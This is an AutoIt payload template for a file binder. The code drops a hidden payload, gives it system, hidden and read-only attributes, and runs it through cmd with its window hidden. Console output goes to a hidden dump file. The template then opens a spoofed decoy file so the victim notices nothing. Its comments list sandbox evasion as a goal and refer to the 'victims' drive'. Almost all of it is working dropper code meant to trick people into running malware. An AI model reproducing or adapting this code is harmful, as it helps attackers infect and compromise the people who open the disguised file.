;Payload Template Version: 0.3.0a

;TODO: * Read return values for a fail safe system
;      * Workround sand boxes
;      * Circumvent Flash drive malwares as they can pose a problem with the directories and execution

;String Format Placeholder values
; 0 - #RequireAdmin pre-processor
; 1 - Payload arguments placeholder (string)
; 2 - Execute through console (bool)
; 3 - Stream console output to a text file (bool)
; 4 - Execute in victims' drive (bool)
; 5 - Wait for payload to finish (bool)
; 6 - Payload name (string)
; 7 - Spoofed File name (string)
; 8 - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
; 9 - Console command execution switch (String | /k or /c)

#NoTrayIcon
{0} 

Global $arguments = "{1}"
Global $cmd = {2}         
Global $cmdstream = {3}
Global $execdrive = {4}
Global $waitpayload = {5}
Global $nmpayload = "{6}"
Global $nmspoof = "{7}"
Global $showwin = {8}
Global $conswitch = "{9}"
Global $drive = StringLeft(@ScriptDir, 3)
Global $spoofarguments

;Initialization

for $i = 1 to $Cmdline[0]
    $spoofarguments &= " " & $Cmdline[$i]
next

extractFiles()

;Extract Files Function - Extracts the payload and spoofed file and executes it.
Func extractFiles()
    ;Extract the Payload
    Local $payloadtarget
    Local $spooftarget = @ScriptDir & "\" & $nmspoof

    If $execdrive Then
        $payloadtarget = @TempDir & "\" & $nmpayload
    Else
        $payloadtarget = @ScriptDir & "\" & $nmpayload
    EndIf

    If FileExists($payloadtarget) = False Then
        FileInstall("$payloadtmp", $payloadtarget, 1)
        FileSetAttrib($payloadtarget, "+S +H +R")
    EndIf

    ;Extract the Spoofed File
    If FileExists($nmspoof) = False Then
        FileInstall("$spooftmp", $nmspoof, 1)
    EndIf

    ;Execute Payload
    Local $executetarget, $prearguments
    Local $dumptarget = @ScriptDir & '\' & ensureRndNm()
    If $cmd Then
        $executetarget = "cmd.exe"
        If $cmdstream Then
            $prearguments = $conswitch & ' "' & $payloadtarget & '" ' & $arguments & ' > ' & $dumptarget & '&attrib +H "' & $dumptarget  & '"'
        Else
            $prearguments = $conswitch & ' "' & $payloadtarget & '" ' & $arguments
        EndIf
    Else
        $executetarget = $payloadtarget
    EndIf
    ShellExecute($executetarget, $prearguments, "", "", $showwin)

    ;Execute Spoof
    ShellExecute($spooftarget, $spoofarguments)
EndFunc

;Ensure Random Name Function - Generates a random .madmp file name while ensuring said file doesn't exist
; * format: DAY-MONTH-YEAR-RANDOM.madmp
; * returns: string
Func ensureRndNm()
    Local $tmpname
    Do
        $tmpname = @MDAY & "-" & @MON & "-" & @YEAR & "-" & Random(100, 999, 1) & ".madmp"
    Until FileExists($tmpname) = False
    return $tmpname
EndFunc